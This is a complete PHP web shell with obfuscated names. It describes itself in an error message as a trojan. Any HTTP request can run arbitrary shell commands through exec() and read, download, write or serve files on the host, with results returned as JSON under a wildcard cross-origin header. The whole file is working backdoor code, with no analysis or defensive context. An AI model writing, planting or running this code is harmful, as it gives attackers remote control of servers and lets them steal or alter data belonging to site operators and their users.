<?php class _0{private $_1 = '';private $_2 = '';private $_3 = array();private $_4 = array('redirect_stderr_to_stdout' => true,);private $_5 = array();private $_6 = array('error' => null, 'output' => null, 'prompt_context' => null,);public function __construct(){if(isset($_SESSION['cwd'])){$this->_2 = $_SESSION['cwd'];} else {$this->_2 = trim(`pwd`);} $this->_6['prompt_context'] = $this->_7();} public function _8($_9){if($_9['action'] == 'shell'){$this->_a($_9['cmd']);} else {$_b = $_9['action'];if(method_exists($this, $_b)){$this->$_b($_9['args']);} else {$this->_6 = array('error' => "wash error: the method $_b is not supported by the trojan.", 'output' => "wash error: the method $_b is not supported by the trojan.", 'prompt_context' => $this->_c,);$this->_d();}}} private function _a($_1){$this->_1 = $_1;if($this->_4['redirect_stderr_to_stdout']){$_1 = "cd {$this->_2};$_1 2>&1;pwd";} else {$_1 = "cd {$this->_2};$_1;pwd";} exec($_1, $this->_5);$this->_2 = array_pop($this->_5);$this->_6 = array('output' => join($this->_5, "\n"), 'prompt_context' => $this->_7(),);$_SESSION['cwd'] = $this->_2;$this->_d();} private function _d(){header('Access-Control-Allow-Origin: *');$this->_6 = array('error' => $this->_6['error'], 'output' => $this->_6['output'], 'prompt_context' => $this->_6['prompt_context'],);echo json_encode($this->_6);die();} private function _7(){$_e = trim(`whoami`);$_f = gethostname();$_g = ($_e === 'root') ? '#' : '$' ;$this->_c = "{$_e}@{$_f}:{$this->_2}{$_g}";return $this->_c;} public function _h($_i){$_j = $_i['file'];chdir($this->_2);if(file_exists($_j)){header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment;filename='.basename($_j));header('Content-Transfer-Encoding: binary');header('Expires: 0');header('Cache-Control: must-revalidate');header('Pragma: public');header('Content-Length: ' . filesize($_j));readfile($_j);} else {echo "The requested file does not exist.";} die();} public function _k($_i){chdir($this->_2);if(!file_exists($_i['file'])){$this->_6 = array('error' => 'The specified file does not exist.', 'prompt_context' => $this->_c,);$this->_d();} if(!is_readable($_i['file'])){$this->_6 = array('error' => 'The specified file is not readable.', 'prompt_context' => $this->_c,);$this->_d();} $_l = array('output' => file_get_contents($_i['file']), 'file' => realpath($_i['file']),);$this->_6 = array('output' => $_l, 'prompt_context' => $this->_c,);$this->_d();} public function _m($_i){$_n = json_encode($_FILES);$_n = json_encode($_FILES);$this->_6 = array('output' => $_n, 'prompt_context' => $this->_c,);$this->_d();} public function _o($_i){chdir($this->_2);if(!file_exists($_i['file'])){$this->_6 = array('error' => 'The specified file does not exist.', 'prompt_context' => $this->_c,);$this->_d();} if(!is_writeable($_i['file'])){$this->_6 = array('error' => 'The specified file is not writeable.', 'prompt_context' => $this->_c,);$this->_d();} $_p = file_put_contents($_i['file'], $_i['data']);if($_p === false){$this->_6 = array('error' => 'Failed to write file.', 'prompt_context' => $this->_c,);} else {$this->_6 = array('output' => 'File written successfully.', 'prompt_context' => $this->_c,);} $this->_d();} public function _q($_i){$_j = $_i['file'];chdir($this->_2);if(file_exists($_j)){$_r = getimagesize($_j);header("Content-Type: {$_r['mime']}");header("Expires: 0");header("Cache-Control: must-revalidate");header("Pragma: public");header("Content-Length: " . filesize($_j));readfile($_j);} else {echo "The requested file does not exist.";} die();}} session_start();$_s = new _0();$_s->_8($_REQUEST);